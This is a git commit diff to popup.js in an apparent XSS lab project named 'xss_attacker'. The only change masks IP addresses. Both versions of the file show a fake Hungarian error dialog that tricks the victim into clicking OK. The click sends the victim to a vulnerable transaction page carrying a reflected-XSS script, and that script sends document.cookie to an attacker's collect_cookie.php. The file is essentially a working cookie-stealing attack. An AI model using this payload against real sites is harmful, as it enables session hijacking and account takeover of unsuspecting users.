1c70136c57f84aa39346e3daf7c14a7cb51a81e9
arpadmoczo <58360514+arpadmoczo@users.noreply.github.com>
2021-04-02 22:16:46 +0200

    Update popup.js

--- xss_attacker/popup.js
+++ xss_attacker/popup.js
@@ -1,5 +1,5 @@
 if (window.confirm("Az oldal betöltése során hiba merült fel! Kérem, kattintson az 'OK' gombra az újratöltéshez!")) 
 {
   //Link sérülékeny elemének kialakításához használt forrás: 
-  window.location.href="http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php?default=Angol<script>document.location='http://192.168.0.105:8080/xss_attacker/collect_cookie.php?c='+document.cookie;</script>";
+  window.location.href="http://192.168.***.***:8080/xss_user/vedekezes_elott/transaction.php?default=Angol<script>document.location='http://192.168.***.***/xss_attacker/collect_cookie.php?c='+document.cookie;</script>";
 };
